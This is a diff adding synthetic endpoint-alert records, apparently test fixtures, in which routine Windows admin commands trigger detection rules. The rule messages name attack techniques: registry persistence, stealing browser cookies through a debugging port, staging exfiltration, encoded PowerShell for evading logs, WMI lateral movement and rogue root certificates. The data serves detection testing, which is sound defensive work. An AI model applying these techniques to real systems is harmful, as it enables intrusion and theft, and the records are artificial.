+  },
+  {
+    "@timestamp": "2023-01-16T05:15:22.000Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "malware",
+        "intrusion_detection"
+      ],
+      "type": [
+        "info",
+        "allowed"
+      ],
+      "action": "rule_detection",
+      "module": "endpoint",
+      "dataset": "endpoint.alerts",
+      "severity": 21,
+      "risk_score": 21,
+      "created": "2023-01-16T05:15:22.000Z",
+      "ingested": "2023-01-16T05:15:23.000Z",
+      "outcome": "success"
+    },
+    "data_stream": {
+      "type": "logs",
+      "dataset": "endpoint.alerts",
+      "namespace": "default"
+    },
+    "host": {
+      "name": "WIN-OPS-02",
+      "hostname": "WIN-OPS-02",
+      "os": {
+        "family": "windows",
+        "type": "windows",
+        "name": "Windows",
+        "version": "10.0.19045"
+      },
+      "architecture": "x86_64"
+    },
+    "user": {
+      "name": "svc_deploy",
+      "domain": "CORP"
+    },
+    "process": {
+      "name": "reg.exe",
+      "pid": 4420,
+      "command_line": "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v ZoomMeetings /t REG_SZ /d C:\\Program Files\\Zoom\\bin\\Zoom.exe /f"
+    },
+    "rule": {
+      "name": "Run Key Added to Registry via Reg.exe",
+      "id": "b4c0d9e8-1f2a-4b3c-5d6e-7f8a9b0c1d2e",
+      "version": "1.0.0"
+    },
+    "message": "Malicious Behavior Detection Alert: reg.exe added a value under CurrentVersion\\Run \u2014 registry run key persistence technique"
+  },
+  {
+    "@timestamp": "2023-01-16T06:00:44.000Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "malware",
+        "intrusion_detection"
+      ],
+      "type": [
+        "info",
+        "allowed"
+      ],
+      "action": "rule_detection",
+      "module": "endpoint",
+      "dataset": "endpoint.alerts",
+      "severity": 21,
+      "risk_score": 21,
+      "created": "2023-01-16T06:00:44.000Z",
+      "ingested": "2023-01-16T06:00:45.000Z",
+      "outcome": "success"
+    },
+    "data_stream": {
+      "type": "logs",
+      "dataset": "endpoint.alerts",
+      "namespace": "default"
+    },
+    "host": {
+      "name": "WIN-DEV-04",
+      "hostname": "WIN-DEV-04",
+      "os": {
+        "family": "windows",
+        "type": "windows",
+        "name": "Windows",
+        "version": "10.0.19045"
+      },
+      "architecture": "x86_64"
+    },
+    "user": {
+      "name": "dev_qa",
+      "domain": "CORP"
+    },
+    "process": {
+      "name": "chrome.exe",
+      "pid": 7710,
+      "command_line": "chrome.exe --remote-debugging-port=9222 --user-data-dir=C:\\Temp\\selenium-profile http://localhost:3000"
+    },
+    "rule": {
+      "name": "Chrome Launched with Remote Debugging Port",
+      "id": "c5d1e0f9-2a3b-4c4d-6e7f-8a9b0c1d2e3f",
+      "version": "1.0.0"
+    },
+    "message": "Malicious Behavior Detection Alert: chrome.exe started with --remote-debugging-port flag \u2014 can be exploited to steal cookies and credentials from browser sessions"
+  },
+  {
+    "@timestamp": "2023-01-16T06:45:10.000Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "malware",
+        "intrusion_detection"
+      ],
+      "type": [
+        "info",
+        "allowed"
+      ],
+      "action": "rule_detection",
+      "module": "endpoint",
+      "dataset": "endpoint.alerts",
+      "severity": 47,
+      "risk_score": 47,
+      "created": "2023-01-16T06:45:10.000Z",
+      "ingested": "2023-01-16T06:45:11.000Z",
+      "outcome": "success"
+    },
+    "data_stream": {
+      "type": "logs",
+      "dataset": "endpoint.alerts",
+      "namespace": "default"
+    },
+    "host": {
+      "name": "WIN-BACKUP-01",
+      "hostname": "WIN-BACKUP-01",
+      "os": {
+        "family": "windows",
+        "type": "windows",
+        "name": "Windows",
+        "version": "10.0.19045"
+      },
+      "architecture": "x86_64"
+    },
+    "user": {
+      "name": "svc_backup",
+      "domain": "CORP"
+    },
+    "process": {
+      "name": "powershell.exe",
+      "pid": 5540,
+      "command_line": "powershell.exe Compress-Archive -Path D:\\UserData -DestinationPath \\\\backup-server\\nightly\\userdata_20230116.zip"
+    },
+    "rule": {
+      "name": "Sensitive Data Archived and Transferred to Network Share",
+      "id": "d6e2f1a0-3b4c-4d5e-7f8a-9b0c1d2e3f4a",
+      "version": "1.0.0"
+    },
+    "message": "Malicious Behavior Detection Alert: PowerShell Compress-Archive writing to a UNC path \u2014 staging pattern consistent with data exfiltration preparation"
+  },
+  {
+    "@timestamp": "2023-01-16T07:20:33.000Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "malware",
+        "intrusion_detection"
+      ],
+      "type": [
+        "info",
+        "allowed"
+      ],
+      "action": "rule_detection",
+      "module": "endpoint",
+      "dataset": "endpoint.alerts",
+      "severity": 47,
+      "risk_score": 47,
+      "created": "2023-01-16T07:20:33.000Z",
+      "ingested": "2023-01-16T07:20:34.000Z",
+      "outcome": "success"
+    },
+    "data_stream": {
+      "type": "logs",
+      "dataset": "endpoint.alerts",
+      "namespace": "default"
+    },
+    "host": {
+      "name": "WIN-WS-10",
+      "hostname": "WIN-WS-10",
+      "os": {
+        "family": "windows",
+        "type": "windows",
+        "name": "Windows",
+        "version": "10.0.19045"
+      },
+      "architecture": "x86_64"
+    },
+    "user": {
+      "name": "svc_sccm",
+      "domain": "CORP"
+    },
+    "process": {
+      "name": "powershell.exe",
+      "pid": 6650,
+      "command_line": "powershell.exe -NonInteractive -NoProfile -enc U3RhcnQtU2VydmljZSAtTmFtZSAnV2luZG93c1VwZGF0ZSc="
+    },
+    "rule": {
+      "name": "Encoded PowerShell Command Execution Detected",
+      "id": "e7f3a2b1-4c5d-4e6f-8a9b-0c1d2e3f4a5b",
+      "version": "1.0.0"
+    },
+    "message": "Malicious Behavior Detection Alert: powershell.exe executed with -enc flag and base64-encoded payload \u2014 commonly used to evade command-line logging"
+  },
+  {
+    "@timestamp": "2023-01-16T07:50:18.000Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "malware",
+        "intrusion_detection"
+      ],
+      "type": [
+        "info",
+        "allowed"
+      ],
+      "action": "rule_detection",
+      "module": "endpoint",
+      "dataset": "endpoint.alerts",
+      "severity": 21,
+      "risk_score": 21,
+      "created": "2023-01-16T07:50:18.000Z",
+      "ingested": "2023-01-16T07:50:19.000Z",
+      "outcome": "success"
+    },
+    "data_stream": {
+      "type": "logs",
+      "dataset": "endpoint.alerts",
+      "namespace": "default"
+    },
+    "host": {
+      "name": "WIN-WS-11",
+      "hostname": "WIN-WS-11",
+      "os": {
+        "family": "windows",
+        "type": "windows",
+        "name": "Windows",
+        "version": "10.0.19045"
+      },
+      "architecture": "x86_64"
+    },
+    "user": {
+      "name": "svc_sccm",
+      "domain": "CORP"
+    },
+    "process": {
+      "name": "wmic.exe",
+      "pid": 7760,
+      "command_line": "wmic /node:WIN-WS-11 /user:svc_sccm product get name,version,installdate"
+    },
+    "rule": {
+      "name": "WMI Remote Query Against Endpoint",
+      "id": "f8a4b3c2-5d6e-4f7a-9b0c-1d2e3f4a5b6c",
+      "version": "1.0.0"
+    },
+    "message": "Malicious Behavior Detection Alert: wmic.exe queried a remote node using explicit credentials \u2014 WMI remote access is a common lateral movement vector"
+  },
+  {
+    "@timestamp": "2023-01-16T08:30:05.000Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "malware",
+        "intrusion_detection"
+      ],
+      "type": [
+        "info",
+        "allowed"
+      ],
+      "action": "rule_detection",
+      "module": "endpoint",
+      "dataset": "endpoint.alerts",
+      "severity": 21,
+      "risk_score": 21,
+      "created": "2023-01-16T08:30:05.000Z",
+      "ingested": "2023-01-16T08:30:06.000Z",
+      "outcome": "success"
+    },
+    "data_stream": {
+      "type": "logs",
+      "dataset": "endpoint.alerts",
+      "namespace": "default"
+    },
+    "host": {
+      "name": "WIN-PKI-01",
+      "hostname": "WIN-PKI-01",
+      "os": {
+        "family": "windows",
+        "type": "windows",
+        "name": "Windows",
+        "version": "10.0.19045"
+      },
+      "architecture": "x86_64"
+    },
+    "user": {
+      "name": "svc_pki",
+      "domain": "CORP"
+    },
+    "process": {
+      "name": "certutil.exe",
+      "pid": 8870,
+      "command_line": "certutil.exe -addstore -f Root C:\\PKI\\CorpRootCA.cer"
+    },
+    "rule": {
+      "name": "CertUtil Certificate Store Modification",
+      "id": "a9b5c4d3-6e7f-4a8b-0c1d-2e3f4a5b6c7d",
+      "version": "1.0.0"
+    },
+    "message": "Malicious Behavior Detection Alert: certutil.exe modified the root certificate store \u2014 technique used to install rogue CA certificates for MitM or payload trust"
+  }
+]
